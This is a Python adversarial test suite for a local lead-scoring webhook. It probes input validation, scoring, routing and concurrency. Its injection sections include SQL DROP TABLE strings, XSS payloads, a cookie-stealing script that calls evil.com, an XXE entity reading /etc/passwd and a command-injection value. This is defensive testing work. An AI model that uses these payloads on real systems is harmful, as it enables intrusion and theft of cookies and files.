#!/usr/bin/env python3
"""
LeadSentry Pro v3 — BRUTAL ADVERSARIAL TEST SUITE
Senior engineer review: every edge case that could break production.
"""
import json, urllib.request, sys, time, concurrent.futures

WEBHOOK = "http://localhost:5678/webhook/leadsentry-v3"
passed = 0
failed = 0
bugs = []

def post(payload, timeout=15):
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(WEBHOOK, data=data, headers={"Content-Type": "application/json"}, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            body = json.loads(raw)
        except:
            body = {"_raw": raw[:300]}
        return e.code, body
    except Exception as e:
        return 0, {"_error": str(e)}

def good_lead(**kw):
    base = {"name":"Test User","email":"test@company.com","description":"Need a data pipeline solution for our team.","company":"Acme","role":"Director","phone":"+15551234567","budget":50000,"source":"website","urgency":"high"}
    base.update(kw)
    return base

def t(name, fn):
    global passed, failed
    try:
        ok, detail = fn()
        if ok:
            passed += 1
            print(f"  PASS  {name}")
        else:
            failed += 1
            bugs.append((name, detail))
            print(f"  FAIL  {name}: {detail}")
    except Exception as e:
        failed += 1
        bugs.append((name, f"EXCEPTION: {e}"))
        print(f"  FAIL  {name}: EXCEPTION {e}")

# ============================================================
# SECTION 1: TYPE CONFUSION ATTACKS
# ============================================================
print("\n=== TYPE CONFUSION ===")

t("name=integer", lambda: (post(good_lead(name=12345))[0] in (200,400), ""))
t("name=array", lambda: (post(good_lead(name=["a","b"]))[0] in (200,400), ""))
t("name=object", lambda: (post(good_lead(name={"x":1}))[0] in (200,400), ""))
t("name=null", lambda: (post(good_lead(name=None))[0] == 400, "Should reject null name"))
t("name=boolean", lambda: (post(good_lead(name=True))[0] in (200,400), ""))
t("email=integer", lambda: (post(good_lead(email=12345))[0] == 400, "Should reject non-string email"))
t("email=array", lambda: (post(good_lead(email=["a@b.com"]))[0] in (200,400), ""))
t("email=object", lambda: (post(good_lead(email={"x":"y"}))[0] in (200,400), ""))
t("budget=string-number", lambda: (post(good_lead(budget="50000"))[0] == 200 and post(good_lead(budget="50000"))[1].get("lead",{}).get("budget") == 50000, "Should parse string budget"))
t("budget=string-garbage", lambda: (post(good_lead(budget="abc"))[0] == 200, "Should handle unparseable budget"))
t("budget=boolean", lambda: (post(good_lead(budget=True))[0] in (200,400), ""))
t("budget=Infinity", lambda: (post(good_lead(budget="Infinity"))[0] in (200,400), ""))
t("budget=NaN", lambda: (post(good_lead(budget="NaN"))[0] in (200,400), ""))
t("budget=99999999999999", lambda: (post(good_lead(budget=99999999999999))[0] == 200, "Should handle huge budget"))
t("urgency=invalid-value", lambda: (post(good_lead(urgency="supercritical"))[0] == 200 and post(good_lead(urgency="supercritical"))[1].get("lead",{}).get("urgency") == "medium", "Should default to medium"))
t("source=invalid-value", lambda: (post(good_lead(source="magic"))[0] == 200 and post(good_lead(source="magic"))[1].get("lead",{}).get("source") == "other", "Should default to other"))

# ============================================================
# SECTION 2: INJECTION ATTACKS
# ============================================================
print("\n=== INJECTION ATTACKS ===")

t("SQL injection name", lambda: (lambda r: (r[0]==200, ""))(post(good_lead(name="'; DROP TABLE leads; --"))))
t("SQL injection email", lambda: (post(good_lead(email="test'; DROP TABLE users; --@evil.com"))[0] == 400, "Should reject invalid email"))
t("SQL injection description", lambda: (post(good_lead(description="Normal description. '; INSERT INTO users VALUES('admin','pass'); --"))[0] == 200, "Should sanitize"))
t("XSS in name", lambda: (lambda r: (r[0]==200 and "<script>" not in r[1].get("lead",{}).get("name",""), ""))(post(good_lead(name="<script>alert(1)</script>"))))
t("XSS in description", lambda: (lambda r: (r[0]==200 and "<script>" not in r[1].get("lead",{}).get("description",""), ""))(post(good_lead(description="<img src=x onerror=alert(1)> Need a solution."))))
t("XSS in company", lambda: (lambda r: (r[0]==200, ""))(post(good_lead(company="<svg onload=alert(1)>"))))
t("NoSQL injection name", lambda: (post(good_lead(name={"$gt":""}))[0] in (200,400), ""))
t("NoSQL injection email", lambda: (post(good_lead(email={"$ne":""}))[0] in (200,400), ""))
t("Path traversal description", lambda: (post(good_lead(description="../../etc/passwd Need a solution for our team."))[0] == 200, "Should sanitize"))
t("LDAP injection", lambda: (post(good_lead(name="*)(uid=*))(|(uid=*"))[0] in (200,400), ""))
t("Command injection", lambda: (post(good_lead(description="; cat /etc/passwd; Need solution."))[0] == 200, "Should sanitize"))
t("Null byte injection", lambda: (post(good_lead(name="Test\x00User"))[0] in (200,400), ""))

# ============================================================
# SECTION 3: BOUNDARY CONDITIONS
# ============================================================
print("\n=== BOUNDARY CONDITIONS ===")

t("name=1 char", lambda: (post(good_lead(name="A"))[0] == 200, "Single char name should pass"))
t("name=200 chars", lambda: (post(good_lead(name="A"*200))[0] == 200, "Max length name"))
t("name=201 chars", lambda: (post(good_lead(name="A"*201))[0] in (200,400), "Over max length"))
t("description=10 chars (min)", lambda: (post(good_lead(description="a"*10))[0] == 200, "Min length description"))
t("description=9 chars", lambda: (post(good_lead(description="a"*9))[0] == 400, "Under min length"))
t("description=5000 chars", lambda: (post(good_lead(description="A"*5000))[0] == 200, "Max length description"))
t("description=5001 chars", lambda: (post(good_lead(description="A"*5001))[0] in (200,400), "Over max length"))
t("email=254 chars (max)", lambda: (post(good_lead(email="a"*63+"@"+"b"*63+"."+"c"*63+"."+"d"*63))[0] in (200,400), "Long email"))
t("phone=1 char", lambda: (post(good_lead(phone="1"))[0] in (200,400), "Too short phone"))
t("phone=20 chars", lambda: (post(good_lead(phone="+1555123456789012345"))[0] in (200,400), "Max phone"))
t("budget=0", lambda: (post(good_lead(budget=0))[0] == 200, "Zero budget"))
t("budget=-1", lambda: (post(good_lead(budget=-1))[0] == 200, "Negative budget"))
t("company=empty string", lambda: (post(good_lead(company=""))[0] == 200, "Empty company"))
t("role=empty string", lambda: (post(good_lead(role=""))[0] == 200, "Empty role"))

# ============================================================
# SECTION 4: UNICODE & ENCODING
# ============================================================
print("\n=== UNICODE & ENCODING ===")

t("UTF-8 name (Chinese)", lambda: (post(good_lead(name="\u7530\u4e2d\u592a\u90ce"))[0] == 200, ""))
t("UTF-8 name (Arabic)", lambda: (post(good_lead(name="\u0627\u0644\u0645\u062f\u064a\u0631"))[0] == 200, ""))
t("UTF-8 name (Emoji)", lambda: (post(good_lead(name="John \U0001f600"))[0] in (200,400), ""))
t("UTF-8 description (Korean)", lambda: (post(good_lead(description="\ud558\ub274 \ud504\ub85c\uc81d\ud2b8\uac00 \ud544\uc694\ud569\ub2c8\ub2e4."))[0] == 200, ""))
t("RTL text", lambda: (post(good_lead(name="\u0645\u062d\u0645\u062f \u0639\u0644\u064a"))[0] == 200, ""))
t("Zero-width characters", lambda: (post(good_lead(name="Te\u200bst"))[0] in (200,400), ""))
t("Surrogate pairs", lambda: (post(good_lead(description="Test \ud83d\ude00 description."))[0] in (200,400), ""))
t("Null bytes in string", lambda: (post(good_lead(description="Test\x00description here."))[0] in (200,400), ""))
t("Newlines in name", lambda: (post(good_lead(name="John\nSmith"))[0] in (200,400), ""))
t("Tabs in name", lambda: (post(good_lead(name="John\tSmith"))[0] in (200,400), ""))

# ============================================================
# SECTION 5: PAYLOAD STRUCTURE ATTACKS
# ============================================================
print("\n=== PAYLOAD STRUCTURE ===")

t("Empty JSON object", lambda: (post({})[0] == 400, ""))
t("Array payload", lambda: (post([good_lead()])[0] in (400,500), ""))
t("String payload", lambda: (post("hello")[0] in (400,500), ""))
t("Number payload", lambda: (post(42)[0] in (400,500), ""))
t("Null payload", lambda: (post(None)[0] in (400,500), ""))
t("Nested body.body", lambda: (post({"body":{"name":"Test","email":"t@co.com","description":"Test description here."}})[0] in (200,400), ""))
t("Extra unknown fields", lambda: (post(good_lead(hackerfield="evil",anotherfield=123))[0] == 200, "Should ignore unknown fields"))
t("Missing all optional fields", lambda: (post({"name":"X","email":"x@co.com","description":"Test description here."})[0] == 200, ""))
t("All fields as empty strings", lambda: (post({"name":"","email":"","description":""})[0] == 400, ""))

# ============================================================
# SECTION 6: EMAIL EDGE CASES
# ============================================================
print("\n=== EMAIL EDGE CASES ===")

t("Email with + tag", lambda: (post(good_lead(email="user+tag@company.com"))[0] == 200, "Plus addressing valid"))
t("Email with subdomain", lambda: (post(good_lead(email="user@mail.company.com"))[0] == 200, "Subdomain valid"))
t("Email with hyphen", lambda: (post(good_lead(email="user@my-company.com"))[0] == 200, "Hyphen valid"))
t("Email with numbers", lambda: (post(good_lead(email="user123@company456.com"))[0] == 200, "Numbers valid"))
t("Email with dots", lambda: (post(good_lead(email="first.last@company.com"))[0] == 200, "Dots valid"))
t("Email with spaces", lambda: (post(good_lead(email="user @company.com"))[0] == 400, "Spaces invalid"))
t("Email double @@@", lambda: (post(good_lead(email="user@@company.com"))[0] == 400, "Double @ invalid"))
t("Email no @", lambda: (post(good_lead(email="usercompany.com"))[0] == 400, "No @ invalid"))
t("Email no TLD", lambda: (post(good_lead(email="user@company"))[0] == 400, "No TLD invalid"))
t("Email single char TLD", lambda: (post(good_lead(email="user@company.c"))[0] == 400, "Single char TLD invalid"))
t("Email .com.", lambda: (post(good_lead(email="user@company.com."))[0] in (200,400), "Trailing dot"))
t("Email unicode domain", lambda: (post(good_lead(email="user@\u043c\u043e\u0441\u043a\u0432\u0430.ru"))[0] in (200,400), "IDN domain"))

# ============================================================
# SECTION 7: BANT & SCORING LOGIC
# ============================================================
print("\n=== BANT & SCORING LOGIC ===")

def check_bant(email, role, budget, urgency, desc, expect_b, expect_a, expect_n, expect_t):
    c, b = post(good_lead(email=email, role=role, budget=budget, urgency=urgency, description=desc))
    if c != 200: return False, f"code={c}"
    bant = b.get("bant", {})
    issues = []
    if expect_b and bant.get("budget") == "unknown": issues.append(f"budget should be known, got unknown")
    if expect_a and bant.get("authority") == "unknown": issues.append(f"authority should be known, got unknown")
    if expect_n and bant.get("need") == "unknown": issues.append(f"need should be known, got unknown")
    if expect_t and bant.get("timeline") == "unknown": issues.append(f"timeline should be known, got unknown")
    return (len(issues) == 0, "; ".join(issues))

t("BANT: high budget detected", lambda: check_bant("u@co.com","Dir",150000,"high","Need solution urgently with approved budget.",True,False,True,True))
t("BANT: decision maker detected", lambda: check_bant("u@co.com","CEO",50000,"high","Ready to buy.",False,True,False,False))
t("BANT: pain signal detected", lambda: check_bant("u@co.com","Mgr",30000,"medium","Struggling with current solution, it is broken.",False,False,True,False))
t("BANT: timeline detected", lambda: check_bant("u@co.com","VP",20000,"critical","Need by end of quarter.",False,False,False,True))
t("BANT: all unknown", lambda: (lambda r: (r[0]==200 and all(r[1].get("bant",{}).get(k) in ("unknown","unclear") for k in ["budget","authority","need","timeline"]), ""))(post(good_lead(email="u@co.com",role="",budget=None,urgency="low",description="Just browsing around."))))

# Score boundary tests
def check_score(email, role, budget, urgency, desc, expect_cat):
    c, b = post(good_lead(email=email, role=role, budget=budget, urgency=urgency, description=desc))
    if c != 200: return False, f"code={c}"
    cat = b.get("score",{}).get("category")
    return (cat == expect_cat, f"expected {expect_cat}, got {cat}")

t("Score: CTO+200k+budget+urgent = hot", lambda: check_score("cto@big.com","CTO",200000,"critical","Urgently need solution. Board approved budget. Demo this week.", "hot"))
t("Score: nobody+0+low = cold", lambda: check_score("x@gmail.com","",None,"low","Just browsing around.", "cold"))
t("Score: director+50k+high = warm", lambda: check_score("dir@co.com","Director",50000,"high","Need a solution for our team.","warm"))
t("Score: manager+10k+medium = nurture", lambda: check_score("mgr@co.com","Manager",10000,"medium","Looking for options.","nurture"))

# Fit score components
def check_fit(email, role, company, companySize, phone, expect_fit_min):
    c, b = post(good_lead(email=email, role=role, company=company, companySize=companySize, phone=phone))
    if c != 200: return False, f"code={c}"
    fit = b.get("score",{}).get("fit",0)
    return (fit >= expect_fit_min, f"expected fit>={expect_fit_min}, got {fit}")

t("Fit: max signals (biz email+senior+large+phone)", lambda: check_fit("vp@bigcorp.com","VP","BigCorp","5000","+15551234567",80))
t("Fit: min signals (personal email+no role+no company)", lambda: check_fit("x@gmail.com","","",None,None,0))

# ============================================================
# SECTION 8: ROUTING LOGIC
# ============================================================
print("\n=== ROUTING LOGIC ===")

def check_routing(email, role, budget, urgency, desc, expect_assign):
    c, b = post(good_lead(email=email, role=role, budget=budget, urgency=urgency, description=desc))
    if c != 200: return False, f"code={c}"
    assign = b.get("routing",{}).get("assignTo","")
    return (expect_assign in assign, f"expected '{expect_assign}' in '{assign}'")

t("Routing: hot -> Senior AE", lambda: check_routing("cto@big.com","CTO",200000,"critical","Urgently need solution. Board approved. Demo this week.","Senior AE"))
t("Routing: cold -> Marketing", lambda: check_routing("x@gmail.com","",None,"low","Just browsing.","Marketing"))
t("Routing: warm -> AE or SDR", lambda: check_routing("dir@co.com","Director",50000,"high","Need solution for team.","AE"))
t("Routing: promising -> SDR", lambda: check_routing("mgr@co.com","Manager",30000,"critical","Urgently need to implement. Budget approved. Decision maker.","SDR"))

# Territory detection
def check_territory(email, expect_t):
    c, b = post(good_lead(email=email))
    if c != 200: return False, f"code={c}"
    t = b.get("routing",{}).get("territory","")
    return (t == expect_t, f"expected {expect_t}, got {t}")

t("Territory: .com -> US", lambda: check_territory("u@company.com","US"))
t("Territory: .co.uk -> UK", lambda: check_territory("u@company.co.uk","UK"))
t("Territory: .de -> DACH", lambda: check_territory("u@company.de","DACH"))
t("Territory: .jp -> APAC", lambda: check_territory("u@company.jp","APAC"))

# ============================================================
# SECTION 9: SPEED & CONCURRENCY
# ============================================================
print("\n=== SPEED & CONCURRENCY ===")

def check_speed():
    start = time.time()
    c, b = post(good_lead())
    elapsed = time.time() - start
    return (c == 200 and elapsed < 2.0, f"took {elapsed:.2f}s, code={c}")

t("Speed: response < 2s", check_speed)

def check_concurrent():
    leads = [good_lead(email=f"user{i}@company{i}.com", name=f"User {i}") for i in range(10)]
    start = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
        futures = [pool.submit(post, l) for l in leads]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    elapsed = time.time() - start
    ok_count = sum(1 for c, _ in results if c == 200)
    return (ok_count == 10 and elapsed < 15, f"{ok_count}/10 OK, {elapsed:.1f}s")

t("Concurrency: 10 simultaneous leads", check_concurrent)

def check_sustained():
    """20 requests in sequence - no crashes."""
    ok = 0
    for i in range(20):
        c, _ = post(good_lead(email=f"sustained{i}@test.com", name=f"Sustained {i}"))
        if c == 200: ok += 1
    return (ok == 20, f"{ok}/20 OK")

t("Sustained: 20 sequential requests", check_sustained)

# ============================================================
# SECTION 10: RESPONSE STRUCTURE VALIDATION
# ============================================================
print("\n=== RESPONSE STRUCTURE ===")

def check_structure():
    c, b = post(good_lead())
    if c != 200: return False, f"code={c}"
    required_top = ["status","code","leadId","receivedAt","processedAt","score","bant","bantSummary","routing","action","lead","context","risks","warnings"]
    missing = [f for f in required_top if f not in b]
    if missing: return False, f"missing top-level: {missing}"
    score_fields = ["fit","intent","category","tier","emoji","breakdown"]
    missing_s = [f for f in score_fields if f not in b.get("score",{})]
    if missing_s: return False, f"missing score: {missing_s}"
    action_fields = ["next","time","assignTo","followUp","openingAngle"]
    missing_a = [f for f in action_fields if f not in b.get("action",{})]
    if missing_a: return False, f"missing action: {missing_a}"
    return (True, "")

t("Structure: all required fields present", check_structure)

def check_score_types():
    c, b = post(good_lead())
    if c != 200: return False, f"code={c}"
    fit = b["score"]["fit"]
    intent = b["score"]["intent"]
    if not isinstance(fit, int) or not isinstance(intent, int): return False, f"fit/intent not int: {type(fit)}/{type(intent)}"
    if not (0 <= fit <= 100): return False, f"fit out of range: {fit}"
    if not (0 <= intent <= 100): return False, f"intent out of range: {intent}"
    return (True, "")

t("Structure: score values in 0-100 range", check_score_types)

def check_category_valid():
    c, b = post(good_lead())
    if c != 200: return False, f"code={c}"
    cat = b["score"]["category"]
    valid = {"hot","warm","promising","nurture","low_intent","cold"}
    return (cat in valid, f"invalid category: {cat}")

t("Structure: category is valid enum", check_category_valid)

def check_tier_valid():
    c, b = post(good_lead())
    if c != 200: return False, f"code={c}"
    tier = b["score"]["tier"]
    return (tier in {"A","B","C","D"}, f"invalid tier: {tier}")

t("Structure: tier is A/B/C/D", check_tier_valid)

# ============================================================
# SECTION 11: ADVERSARIAL DESCRIPTIONS
# ============================================================
print("\n=== ADVERSARIAL DESCRIPTIONS ===")

t("Description: 1000 words", lambda: (post(good_lead(description="word "*1000))[0] == 200, ""))
t("Description: all punctuation", lambda: (post(good_lead(description="!@#$%^&*()_+-=[]{}|;':\",./<>?`~"*2))[0] in (200,400), ""))
t("Description: only spaces", lambda: (post(good_lead(description=" "*100))[0] in (200,400), ""))
t("Description: HTML tags only", lambda: (post(good_lead(description="<p><div><span><b><i><a href=x>test</a></i></b></span></div></p> Need solution."))[0] == 200, ""))
t("Description: script injection", lambda: (post(good_lead(description="<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>"))[0] == 200, ""))
t("Description: template injection", lambda: (post(good_lead(description="${7*7} {{7*7}} <%= 7*7 %> Need solution."))[0] == 200, ""))
t("Description: base64 payload", lambda: (post(good_lead(description="SGVsbG8gV29ybGQgZmFrZSBkZXNjcmlwdGlvbg== Need a real solution."))[0] == 200, ""))
t("Description: JSON in description", lambda: (post(good_lead(description='{"name":"test","role":"admin"} Need a solution.'))[0] == 200, ""))
t("Description: XML bomb", lambda: (post(good_lead(description="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> Need &xxe; solution."))[0] == 200, ""))

# ============================================================
# SECTION 12: WHAT HAPPENS WITH BROKEN DATA
# ============================================================
print("\n=== BROKEN DATA RESILIENCE ===")

t("Random bytes as body", lambda: (lambda r: (r[0] in (400,500) or r[0]==200, f"code={r[0]}"))(post("asdfjkl;12345!@#$%")))
t("HTML form data", lambda: (lambda r: (r[0] in (400,500), f"code={r[0]}"))(post("name=test&email=test@co.com&desc=solution")))
t("XML body", lambda: (lambda r: (r[0] in (400,500), f"code={r[0]}"))(post("<lead><name>Test</name></lead>")))
t("CSV body", lambda: (lambda r: (r[0] in (400,500), f"code={r[0]}"))(post("name,email,desc\ntest,t@co.com,need solution")))

# ============================================================
# SUMMARY
# ============================================================
print(f"\n{'='*60}")
print(f"BRUTAL TEST RESULTS: {passed} passed, {failed} failed, {passed+failed} total")
print(f"{'='*60}")

if bugs:
    print(f"\nBUGS FOUND ({len(bugs)}):")
    for name, detail in bugs:
        print(f"  [{name}] {detail}")

sys.exit(0 if failed == 0 else 1)
